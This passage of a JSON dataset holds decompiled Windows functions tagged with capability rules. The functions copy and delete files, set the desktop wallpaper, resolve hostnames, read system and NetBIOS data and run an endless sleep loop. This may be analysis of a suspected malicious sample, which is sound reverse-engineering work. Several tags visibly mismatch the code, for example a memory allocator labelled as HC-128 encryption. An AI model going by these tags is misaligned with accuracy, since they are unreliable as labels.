fcn.0040a22c();\n        fcn.00463d78();\n        fcn.0040a604();\n        fcn.00405800();\n        fcn.004058fc();\n        fcn.0040a604();\n        fcn.00405784();\n        fcn.004058fc();\n        sub.kernel32.dll_CopyFileA();\n        fcn.0040a604();\n        fcn.00405784();\n        fcn.004058fc();\n        fcn.00405664();\n        fcn.004058fc();\n        iVar1 = sub.kernel32.dll_DeleteFileA();\n        uVar2 = iVar1 == 0;\n    }\n    fcn.00405894();\n    if (uVar2) {\n        fcn.00463d14();\n        fcn.00405738();\n        fcn.004058fc();\n        sub.kernel32.dll_DeleteFileA();\n        fcn.00463d14();\n        fcn.00405738();\n        fcn.004058fc();\n        fcn.00463d78();\n        fcn.00405738();\n        fcn.004058fc();\n        sub.kernel32.dll_CopyFileA();\n    }\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread();\n}\n",
        "token_count": 1374
    },
    "00488b14": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00488b14(uint param_1)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    fcn.00405b8c(param_1);\n    iVar2 = *in_EAX;\n    if (iVar2 != 0) {\n        iVar2 = *(iVar2 + -4);\n    }\n    uVar1 = fcn.004058fc();\n    sub.kernel32.dll_GetTempPathA(iVar2, uVar1);\n    fcn.00405b8c();\n    return;\n}\n",
        "token_count": 128
    },
    "00488ba4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00488c1a)\n// WARNING: Removing unreachable block (ram,0x00488c2c)\n\nvoid fcn.00488ba4(void)\n\n{\n    char in_AL;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    puStack40 = &stack0xfffffffc;\n    uStack32 = 0x488cb5;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack44 = 0x488c90;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    fcn.00420f38();\n    fcn.00421014();\n    fcn.00421158();\n    if (in_AL != '\\0') {\n        fcn.00409af4();\n    }\n    fcn.004218dc();\n    fcn.004054c0();\n    fcn.0042187c();\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x488c97;\n    uStack44 = 0x488c82;\n    fcn.00404640();\n    uStack44 = 2;\n    uStack48 = 0;\n    sub.user32.dll_SystemParametersInfoA(0x14, 0);\n    return;\n}\n",
        "token_count": 365
    },
    "00489450": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00489450(void)\n\n{\n    uint *puVar1;\n    uint in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uchar uVar4;\n    uint uStackY468;\n    uint uStack448;\n    uint uStack444;\n    uchar *puStack440;\n    uint var_1a4h;\n    uint var_1a0h;\n    uint var_19ch;\n    uint lpWSAData;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack440 = &stack0xfffffffc;\n    var_1a0h = 0;\n    var_1a4h = 0;\n    var_19ch = 0;\n    var_4h = 0;\n    uStack444 = 0x48959a;\n    uStack448 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack448;\n    fcn.00405664();\n    uVar4 = var_4h == 0 || var_4h == 4;\n    fcn.00405964(&var_19ch);\n    fcn.00405894();\n    if (uVar4) {\n        uVar4 = var_4h == 0 || var_4h == 4;\n        fcn.004059a4();\n    }\n    fcn.00405964(&var_1a4h);\n    fcn.00409754();\n    fcn.00405894();\n    if (uVar4) {\n        fcn.004059a4();\n        in_EAX = fcn.004058fc();\n    }\n    sub.wsock32.dll_WSAStartup(0x101, &lpWSAData);\n    var_8h = 0x4895c8;\n    iVar2 = sub.wsock32.dll_gethostbyname();\n    uStackY468 = in_EAX;\n    if (iVar2 != 0) {\n        iVar2 = *(iVar2 + 0xc);\n        for (iVar3 = 0; puVar1 = *(iVar2 + iVar3 * 4),  puVar1 != NULL; iVar3 = iVar3 + 1) {\n            uStackY468 = *puVar1;\n            var_8h = sub.wsock32.dll_inet_ntoa();\n        }\n        sub.wsock32.dll_WSACleanup();\n    }\n    *in_FS_OFFSET = uStackY468;\n    fcn.00405490(0x4895a1);\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 561
    },
    "00489f50": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00489f50(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    uchar uVar1;\n    int32_t iStack300;\n    uint uStack296;\n    uchar *puStack292;\n    uint var_114h;\n    uint pszPath;\n    uint pidl;\n    int32_t var_4h;\n    \n    puStack292 = &stack0xfffffffc;\n    var_114h = 0;\n    var_4h = 0;\n    uStack296 = 0x48a010;\n    iStack300 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack300;\n    sub.shell32.dll_SHGetSpecialFolderLocation(0);\n    sub.shell32.dll_SHGetPathFromIDListA(pidl, &pszPath);\n    fcn.0040aa8c();\n    uVar1 = var_4h == 0 || var_4h == 4;\n    fcn.00405964();\n    fcn.00405894();\n    if (uVar1) {\n        fcn.004054c0();\n    }\n    else {\n        fcn.00405784();\n    }\n    *in_FS_OFFSET = &var_114h;\n    fcn.0040546c(0x48a017);\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 288
    },
    "0048bf58": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048bf58(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = in_EAX;\n    if (in_EAX != 0) {\n        iVar1 = *(in_EAX + -4);\n    }\n    for (; (0 < iVar1 && (*(in_EAX + -1 + iVar1) < 0x21)); iVar1 = iVar1 + -1) {\n    }\n    fcn.00405964(param_2);\n    return;\n}\n",
        "token_count": 124
    },
    "0048c5c8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0048c71c)\n\nvoid fcn.0048c5c8(void)\n\n{\n    uint *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uStack200;\n    uint uStack184;\n    uint uStack180;\n    uchar *puStack176;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    int32_t var_88h;\n    int32_t var_84h;\n    uint var_80h;\n    \n    puStack176 = &stack0xfffffffc;\n    uStack180 = 0x48c79f;\n    uStack184 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack184;\n    fcn.004054c0();\n    lpVersionInformation = 0x94;\n    sub.kernel32.dll_GetVersionExA(&lpVersionInformation);\n    if (var_84h == 1) {\n        if (var_8ch == 0) {\n            fcn.004054c0();\n        }\n        else if (var_8ch == 10) {\n            fcn.004054c0();\n        }\n        else if (var_8ch == 0x5a) {\n            fcn.004054c0();\n        }\n    }\n    else if (var_84h == 2) {\n        if (var_90h == 4) {\n            fcn.004054c0();\n        }\n        else if (var_90h == 5) {\n            if (var_8ch == 0) {\n                fcn.004054c0();\n            }\n            else if (var_8ch == 1) {\n                fcn.004054c0();\n            }\n            else if (var_8ch == 2) {\n                fcn.004054c0();\n            }\n        }\n        else if (var_90h == 6) {\n            if (var_8ch == 0) {\n                fcn.004054c0();\n            }\n            else if (var_8ch == 1) {\n                fcn.004054c0();\n            }\n        }\n    }\n    fcn.004056dc();\n    if (var_88h != 0) {\n        uVar3 = *in_EAX;\n        uVar2 = 0x48c898;\n        uVar1 = 0;\n        fcn.00409dd4(var_88h);\n        fcn.00405800(0x48c8a4, 0, var_88h, uVar1, uVar2, uVar3);\n    }\n    *in_FS_OFFSET = uStack200;\n    fcn.00405490(0x48c7a6);\n    return;\n}\n",
        "token_count": 642
    },
    "0048c938": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048c938(uint param_1, uint8_t **param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t *in_EAX;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    \n    puVar2 = in_EAX;\n    if (in_EAX != NULL) {\n        puVar2 = *(in_EAX + -4);\n    }\n    fcn.00405b8c();\n    puVar3 = *param_2;\n    for (; puVar2 != NULL; puVar2 = puVar2 + -1) {\n        uVar1 = *in_EAX;\n        if ((0x40 < uVar1) && (uVar1 < 0x5b)) {\n            uVar1 = uVar1 + 0x20;\n        }\n        *puVar3 = uVar1;\n        in_EAX = in_EAX + 1;\n        puVar3 = puVar3 + 1;\n    }\n    return;\n}\n",
        "token_count": 226
    },
    "0048cc8c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0048cc8c(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *in_stack_fffffcf8;\n    int32_t iStack764;\n    uint uStack760;\n    uchar *puStack756;\n    uint var_2e4h;\n    uint var_2e0h;\n    uint var_2dch;\n    uint var_2d8h;\n    uint var_2d4h;\n    uint var_2d0h;\n    uint var_2cch;\n    uint var_2c8h;\n    uint var_2c4h;\n    uint var_2c0h;\n    uint var_2bch;\n    uint var_2b8h;\n    uint var_2b2h;\n    uint var_48h;\n    int32_t var_44h;\n    ushort var_40h;\n    uint var_3eh;\n    uint var_18h;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    puStack756 = 0x48cca9;\n    fcn.004058ec();\n    uStack760 = 0x48ce1a;\n    iStack764 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffd04;\n    puStack756 = &stack0xfffffffc;\n    fcn.00403aac();\n    var_48h._0_1_ = 0x32;\n    sub.netapi32.dll_Netbios(&fcn.0048cc8c::var_48h);\n    fcn.00403aac();\n    fcn.00403aac();\n    fcn.0040595c();\n    fcn.004030ec();\n    var_48h._0_1_ = 0x33;\n    var_18h._0_1_ = 0;\n    var_40h = 0x26a;\n    iVar1 = fcn.00402ef0();\n    if (iVar1 == 0) {\n        fcn.004054c0();\n    }\n    else {\n        var_44h = iVar1;\n        sub.netapi32.dll_Netbios(&fcn.0048cc8c::var_48h);\n        fcn.004030ec();\n        in_stack_fffffcf8 = &fcn.0048cc8c::var_8h;\n        fcn.0040af7c(in_stack_fffffcf8);\n        fcn.00402f0c();\n        fcn.004054c0();\n    }\n    *in_FS_OFFSET = in_stack_fffffcf8;\n    fcn.00405490(0x48ce21);\n    return;\n}\n",
        "token_count": 604
    },
    "0048d1e8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __fastcall fcn.0048d1e8(uint param_1, uint param_2)\n\n{\n    uint in_EAX;\n    uchar *puVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStackY76;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    uint var_10h;\n    uchar *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0x5;\n    do {\n        var_ch = var_ch + -1;\n    } while (var_ch != NULL);\n    var_18h = 0x48d208;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    fcn.004058ec();\n    var_1ch = 0x48d33c;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0048d1e8::var_20h;\n    var_ch = *0x49eb9c;\n    puVar1 = *0x49eb9c;\n    if (*0x49eb9c != NULL) {\n        puVar1 = *(*0x49eb9c + -4);\n    }\n    var_18h = &stack0xfffffffc;\n    if (puVar1 == NULL) {\n        var_18h = &stack0xfffffffc;\n        fcn.0048d138();\n    }\n    fcn.00405800(0x48d364, var_4h, 0x48d354);\n    fcn.00409754();\n    iVar2 = fcn.00405a48();\n    if (0 < iVar2) {\n        fcn.00405800(0x48d364, var_4h, 0x48d354);\n        fcn.00409754();\n        var_ch = var_18h;\n        fcn.00405800(0x48d364, var_4h, 0x48d354);\n        fcn.00409754();\n        fcn.00405a48();\n        fcn.00405784();\n        fcn.00409754();\n        fcn.00405a48();\n        uStackY76 = var_8h;\n        fcn.00405964();\n    }\n    *in_FS_OFFSET = uStackY76;\n    fcn.00405490(0x48d343);\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 660
    },
    "0048d860": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0048d860(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack20 = 0x48d8d3;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack24;\n    fcn.0040a604();\n    fcn.00405964(&var_4h);\n    do {\n        sub.kernel32.dll_Sleep_1();\n        fcn.0048d630();\n    } while( true );\n}\n",
        "token_count": 152
    },
    "004015dc": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid fcn.004015dc(void)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    uint8_t uVar4;\n    int32_t **in_EAX;\n    uint32_t uVar5;\n    \n    piVar2 = in_EAX[1];\n    piVar3 = *in_EAX;\n    *piVar2 = piVar3;\n    piVar3[1] = piVar2;\n    if (piVar2 == piVar3) {\n        uVar5 = piVar2 + -0x124dea >> 8 & 0xff;\n        uVar4 = piVar2 + -0x124dea >> 3 & 0x1f;\n        puVar1 = uVar5 * 4 + 0x493728;\n        *puVar1 = *puVar1 & (-2 << uVar4 | 0xfffffffeU >> 0x20 - uVar4);\n        if (*puVar1 == 0) {\n            uVar4 = uVar5 & 0x1f;\n            *0x493724 = *0x493724 & (-2 << uVar4 | 0xfffffffeU >> 0x20 - uVar4);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 288
    },
    "0040161c": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040161c(uint param_1, int32_t param_2)\n\n{\n    uint32_t *puVar1;\n    int32_t **ppiVar2;\n    int32_t *in_EAX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    \n    uVar3 = param_2 - 0xb30U >> 8;\n    iVar4 = (uVar3 - 0x3ff & -(uVar3 < 0x3ff)) + 0x3ff;\n    uVar3 = iVar4 * 8;\n    ppiVar2 = *(uVar3 + 0x4937ac);\n    *in_EAX = uVar3 + 0x4937a8;\n    in_EAX[1] = ppiVar2;\n    *ppiVar2 = in_EAX;\n    *(uVar3 + 0x4937ac) = in_EAX;\n    if (ppiVar2 != uVar3 + 0x4937a8) {\n        return;\n    }\n    uVar3 = uVar3 >> 8 & 0xff;\n    puVar1 = uVar3 * 4 + 0x493728;\n    *puVar1 = *puVar1 | 1 << (iVar4 & 0x1f);\n    *0x493724 = *0x493724 | 1 << (uVar3 & 0x1f);\n    return;\n}\n",
        "token_count": 320
    },
    "004019fc": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nuint8_t ** fcn.004019fc(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    uint32_t *puVar4;\n    uint16_t uVar5;\n    uint8_t *puVar6;\n    uint8_t uVar7;\n    uint8_t **ppuVar8;\n    uint8_t **ppuVar9;\n    uint8_t *in_EAX;\n    uint8_t **ppuVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint8_t *puVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    bool bVar19;\n    \n    if (0xa2c < in_EAX) {\n        if (0x40a2c < in_EAX) {\n            if (in_EAX < 0) {\n                return NULL;\n            }\n            ppuVar10 = sub.kernel32.dll_VirtualAlloc(0, in_EAX + 0x10013 & 0xffff0000, 0x101000, 4);\n            if (ppuVar10 != NULL) {\n                ppuVar10[2] = in_EAX;\n                ppuVar10[3] = in_EAX + 0x10013 & 0xffff0000 | 4;\n                fcn.00401760();\n                ppuVar8 = *0x4957b0;\n                *ppuVar10 = 0x4957ac;\n                ppuVar9 = ppuVar10;\n                ppuVar10[1] = *0x4957b0;\n                *0x4957b0 = ppuVar9;\n                *ppuVar8 = ppuVar10;\n                *0x4957a8 = 0;\n                ppuVar10 = ppuVar10 + 4;\n            }\n            return ppuVar10;\n        }\n        uVar17 = in_EAX + 0xd3 & 0xffffff00;\n        uVar18 = uVar17 + 0x30;\n        if (*0x49304d != '\\0') {\n            while( true ) {\n                LOCK();\n                bVar19 = *0x493718 == 0;\n                *0x493718 = *0x493718 ^ bVar19 * (*0x493718 ^ 1);\n                if (bVar19) break;\n                if (*0x4935b5 == '\\0') {\n                    sub.kernel32.dll_Sleep();\n                    LOCK();\n                    bVar19 = *0x493718 == 0;\n                    *0x493718 = *0x493718 ^ bVar19 * (*0x493718 ^ 1);\n                    if (bVar19) break;\n                    sub.kernel32.dll_Sleep();\n                }\n            }\n        }\n        uVar15 = uVar17 - 0xb00;\n        uVar14 = uVar15 >> 0xd;\n        uVar11 = -1 << (uVar15 >> 8 & 0x1f) & *(uVar14 * 4 + 0x493728);\n        if (uVar11 == 0) {\n            uVar15 = -2 << (uVar14 & 0x1f) & *0x493724;\n            if (uVar15 == 0) {\n                if (*0x493720 < uVar18) {\n                    ppuVar10 = fcn.004016e8();\n                }\n                else {\n                    ppuVar10 = *0x49371c - uVar18;\n                    *0x49371c = ppuVar10;\n                    *0x493720 = *0x493720 - uVar18;\n                    ppuVar10[-1] = uVar18 | 2;\n                }\n                *0x493718 = 0;\n                return ppuVar10;\n            }\n            uVar14 = 0;\n            if (uVar15 != 0) {\n                for (; (uVar15 >> uVar14 & 1) == 0; uVar14 = uVar14 + 1) {\n                }\n            }\n            uVar15 = *(uVar14 * 4 + 0x493728);\n            uVar12 = 0;\n            if (uVar15 != 0) {\n                for (; (uVar15 >> uVar12 & 1) == 0; uVar12 = uVar12 + 1) {\n                }\n            }\n            uVar12 = uVar12 | uVar14 << 5;\n        }\n        else {\n            uVar12 = 0;\n            if (uVar11 != 0) {\n                for (; (uVar11 >> uVar12 & 1) == 0; uVar12 = uVar12 + 1) {\n                }\n            }\n            uVar12 = uVar15 >> 8 & 0xffffffe0 | uVar12;\n        }\n        iVar13 = uVar12 * 8;\n        ppuVar10 = *(iVar13 + 0x4937ac);\n        piVar1 = ppuVar10[1];\n        *(iVar13 + 0x4937ac) = piVar1;\n        *piVar1 = iVar13 + 0x4937a8;\n        if (iVar13 + 0x4937a8 == piVar1) {\n            uVar7 = uVar12 & 0x1f;\n            puVar4 = uVar14 * 4 + 0x493728;\n            *puVar4 = *puVar4 & (-2 << uVar7 | 0xfffffffeU >> 0x20 - uVar7);\n            if (*puVar4 == 0) {\n                puVar3 = (uVar14 >> 3) + 0x493724;\n                *puVar3 = *puVar3 & ~('\\x01' << (uVar14 & 7));\n            }\n        }\n        uVar15 = (ppuVar10[-1] & 0xfffffff0) - uVar18;\n        if (uVar15 == 0) {\n            puVar3 = ((ppuVar10[-1] & 0xfffffff0) - 4) + ppuVar10;\n            *puVar3 = *puVar3 & 0xf7;\n        }\n        else {\n            *(ppuVar10 + uVar17 + 0x2c) = uVar15 + 3;\n            *(ppuVar10 + (uVar15 - 8) + uVar18) = uVar15;\n            if (0xb2f < uVar15) {\n                fcn.0040161c();\n            }\n        }\n        ppuVar10[-1] = uVar17 + 0x32;\n        *0x493718 = 0;\n        return ppuVar10;\n    }\n    iVar13 = *((in_EAX + 3 >> 3) + 0x4935c0) * 8;\n    puVar3 = iVar13 + 0x490044;\n    puVar16 = puVar3;\n    if (*0x49304d != '\\0') {\n        while( true ) {\n            LOCK();\n            uVar7 = *puVar3;\n            *puVar3 = *puVar3 ^ (uVar7 == 0) * (*puVar3 ^ 1);\n            puVar16 = puVar3;\n            if (uVar7 == 0) break;\n            puVar16 = iVar13 + 0x490064;\n            LOCK();\n            uVar7 = *puVar16;\n            *puVar16 = *puVar16 ^ (uVar7 == 0) * (*puVar16 ^ 1);\n            if (uVar7 == 0) break;\n            puVar16 = iVar13 + 0x490084;\n            LOCK();\n            uVar7 = *puVar16;\n            *puVar16 = *puVar16 ^ (uVar7 == 0) * (*puVar16 ^ 1);\n            if (uVar7 == 0) break;\n            if (*0x4935b5 == '\\0') {\n                sub.kernel32.dll_Sleep(0);\n                LOCK();\n                uVar7 = *puVar3;\n                *puVar3 = *puVar3 ^ (uVar7 == 0) * (*puVar3 ^ 1);\n                puVar16 = puVar3;\n                if (uVar7 == 0) break;\n                sub.kernel32.dll_Sleep();\n            }\n        }\n    }\n    puVar3 = *(puVar16 + 4);\n    ppuVar10 = *(puVar3 + 8);\n    if (puVar3 != puVar16) {\n        *(puVar3 + 0xc) = *(puVar3 + 0xc) + 1;\n        puVar6 = ppuVar10[-1];\n        *(puVar3 + 8) = puVar6 & 0xfffffff8;\n        ppuVar10[-1] = puVar3;\n        if ((puVar6 & 0xfffffff8) != 0) {\n            *puVar16 = 0;\n            return ppuVar10;\n        }\n        iVar13 = *(puVar3 + 4);\n        *(iVar13 + 0x14) = puVar16;\n        *(puVar16 + 4) = iVar13;\n        *puVar16 = 0;\n        return ppuVar10;\n    }\n    puVar3 = *(puVar16 + 0x10);\n    uVar5 = *(puVar16 + 2);\n    if (ppuVar10 < *(puVar16 + 0xc) || ppuVar10 == *(puVar16 + 0xc)) {\n        piVar1 = puVar3 + 0xc;\n        *piVar1 = *piVar1 + 1;\n        *(puVar16 + 8) = uVar5 + ppuVar10;\n        *puVar16 = 0;\n        ppuVar10[-1] = puVar3;\n        return ppuVar10;\n    }\n    if (*0x49304d != '\\0') {\n        while( true ) {\n            LOCK();\n            bVar19 = *0x493718 == 0;\n            *0x493718 = *0x493718 ^ bVar19 * (*0x493718 ^ 1);\n            if (bVar19) break;\n            if (*0x4935b5 == '\\0') {\n                sub.kernel32.dll_Sleep();\n                LOCK();\n                bVar19 = *0x493718 == 0;\n                *0x493718 = *0x493718 ^ bVar19 * (*0x493718 ^ 1);\n                if (bVar19) break;\n                sub.kernel32.dll_Sleep();\n            }\n        }\n    }\n    uVar17 = puVar16[1] & *0x493724;\n    if (uVar17 == 0) {\n        if (*0x493720 < *(puVar16 + 0x18)) {\n            uVar17 = *(puVar16 + 0x1a);\n            ppuVar10 = fcn.004016e8();\n            if (ppuVar10 == NULL) {\n                *0x493718 = 0;\n                *puVar16 = 0;\n                return NULL;\n            }\n        }\n        else {\n            uVar17 = *0x493720;\n            if (*(puVar16 + 0x1a) + 0xb30 <= *0x493720) {\n                uVar17 = *(puVar16 + 0x1a);\n            }\n            ppuVar10 = *0x49371c - uVar17;\n            *0x493720 = *0x493720 - uVar17;\n            *0x49371c = ppuVar10;\n        }\n    }\n    else {\n        uVar18 = 0;\n        if (uVar17 != 0) {\n            for (; (uVar17 >> uVar18 & 1) == 0; uVar18 = uVar18 + 1) {\n            }\n        }\n        uVar17 = *(uVar18 * 4 + 0x493728);\n        iVar13 = 0;\n        if (uVar17 != 0) {\n            for (; (uVar17 >> iVar13 & 1) == 0; iVar13 = iVar13 + 1) {\n            }\n        }\n        iVar13 = iVar13 + uVar18 * 0x20;\n        iVar2 = iVar13 * 8;\n        ppuVar10 = *(iVar2 + 0x4937ac);\n        piVar1 = ppuVar10[1];\n        *(iVar2 + 0x4937ac) = piVar1;\n        *piVar1 = iVar2 + 0x4937a8;\n        if (iVar2 + 0x4937a8 == piVar1) {\n            uVar7 = iVar13 & 0x1f;\n            puVar4 = uVar18 * 4 + 0x493728;\n            *puVar4 = *puVar4 & (-2 << uVar7 | 0xfffffffeU >> 0x20 - uVar7);\n            if (*puVar4 == 0) {\n                puVar3 = (uVar18 >> 3) + 0x493724;\n                *puVar3 = *puVar3 & ~('\\x01' << (uVar18 & 7));\n            }\n        }\n        uVar17 = ppuVar10[-1] & 0xfffffff0;\n        if (uVar17 < 0x10a60) {\n            puVar3 = (uVar17 - 4) + ppuVar10;\n            *puVar3 = *puVar3 & 0xf7;\n        }\n        else {\n            uVar18 = *(puVar16 + 0x1a);\n            iVar13 = uVar17 - uVar18;\n            *(ppuVar10 + (uVar18 - 4)) = iVar13 + 3;\n            *(ppuVar10 + iVar13 + -8 + uVar18) = iVar13;\n            fcn.0040161c();\n            uVar17 = uVar18;\n        }\n    }\n    ppuVar10[-1] = uVar17 + 6;\n    *0x493718 = 0;\n    *ppuVar10 = puVar16;\n    ppuVar10[2] = NULL;\n    ppuVar10[3] = 0x1;\n    *(puVar16 + 0x10) = ppuVar10;\n    *(puVar16 + 8) = *(puVar16 + 2) + ppuVar10 + 8;\n    *(puVar16 + 0xc) = ppuVar10 + (uVar17 - *(puVar16 + 2));\n    *puVar16 = 0;\n    ppuVar10[7] = ppuVar10;\n    return ppuVar10 + 8;\n}\n",
        "token_count": 3298
    },
    "00402c88": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid fcn.00402c88(void)\n\n{\n    uint32_t uVar1;\n    uint16_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    iVar3 = 0;\n    puVar2 = 0x490046;\n    uVar1 = 0;\n    do {\n        if ((*0x493706 == '\\0') || (uVar4 = uVar1,  (*puVar2 & 0xf) == 0)) {\n            uVar4 = *puVar2 >> 3;\n            for (; uVar1 < uVar4; uVar1 = uVar1 + 1) {\n                *(uVar1 + 0x4935c0) = iVar3 * '\\x04';\n            }\n        }\n        iVar3 = iVar3 + 1;\n        puVar2 = puVar2 + 0x10;\n        uVar1 = uVar4;\n    } while (iVar3 != 0x37);\n    return;\n}\n",
        "token_count": 221
    },
    "00405894": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nchar * __fastcall fcn.00405894(uint param_1, char *param_2)\n\n{\n    uint32_t uVar1;\n    char *in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    \n    if (in_EAX != param_2) {\n        if ((in_EAX & param_2) == 0) {\n            if (in_EAX == NULL) {\n                return NULL;\n            }\n            if (param_2 == NULL) {\n                return in_EAX;\n            }\n        }\n        if (*in_EAX - *param_2 == 0) {\n            uVar5 = *(in_EAX + -4) - *(param_2 + -4);\n            iVar3 = (((*in_EAX - *param_2) - 1) + (*(in_EAX + -4) < *(param_2 + -4)) & uVar5) - *(in_EAX + -4);\n            uVar2 = in_EAX - iVar3;\n            iVar4 = iVar3;\n            while (uVar6 = *(iVar4 + uVar2) ^ *(param_2 + (iVar4 - iVar3)),  uVar6 == 0) {\n                iVar4 = iVar4 + 4;\n                if (-1 < iVar4) goto code_r0x004058c4;\n            }\n            uVar1 = 0;\n            if (uVar6 != 0) {\n                for (; (uVar6 >> uVar1 & 1) == 0; uVar1 = uVar1 + 1) {\n                }\n            }\n            iVar4 = iVar4 + (uVar1 >> 3);\n            if (iVar4 < 0) {\n                return uVar2 & 0xffffff00 | *(iVar4 + uVar2);\n            }\ncode_r0x004058c4:\n            in_EAX = uVar5 * 2;\n        }\n    }\n    return in_EAX;\n}\n",
        "token_count": 448
    },
    "00409864": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
